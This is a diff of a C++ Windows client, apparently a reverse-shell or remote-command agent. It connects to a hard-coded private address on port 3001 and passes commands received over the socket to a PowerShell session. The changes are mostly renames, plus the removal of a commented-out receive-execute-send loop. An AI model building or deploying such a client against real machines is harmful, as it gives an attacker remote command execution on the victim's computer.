@@ -9,7 +9,7 @@
 
 VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
-    CHAR carrRecvbuf[4096];
+    CHAR carrRecvbuf[MAX_BUFFER_SIZE];
     uint32_t uiNetMessageLen;
     std::string szCwd;
     std::string szFinalCwd;
@@ -32,12 +32,12 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
 }
 
 
-int main() {
+INT main() {
+    const INT iServerPort = 3001;
+    const CHAR* szServerIp = "192.168.20.5";
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
     sockaddr_in serverAddr = {};
-    const CHAR* server_ip = "192.168.20.5";
-    const INT server_port = 3001;
     PowerShellSession psSession;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -53,9 +53,9 @@ int main() {
     }
 
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(server_port);
+    serverAddr.sin_port = htons(iServerPort);
 
-    if (inet_pton(AF_INET, server_ip, &serverAddr.sin_addr) != 1) {
+    if (inet_pton(AF_INET, szServerIp, &serverAddr.sin_addr) != 1) {
         std::cerr << "Invalid IP address\n";
         closesocket(sock);
         WSACleanup();
@@ -69,22 +69,8 @@ int main() {
         return 1;
     }
 
-    std::cout << "[+] Connected to server " << server_ip << ":" << server_port << "\n";
+    std::cout << "[+] Connected to server " << szServerIp << ":" << iServerPort << "\n";
     CommandListenerLoop(sock, psSession);
-    //char recvbuf[4096];
-    //int recvlen;
-    //while ((recvlen = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0)) > 0) {
-    //    recvbuf[recvlen] = '\0';
-    //    std::string command(recvbuf);
-
-    //    std::cout << "[+] Received command: " << command << "\n";
-    //    std::string output = psSession.RunCommand(command);
-
-    //    // Send output back to server
-    //    send(sock, output.c_str(), output.length(), 0);
-    //    
-    //}
-
     closesocket(sock);
     WSACleanup();
     return 0;
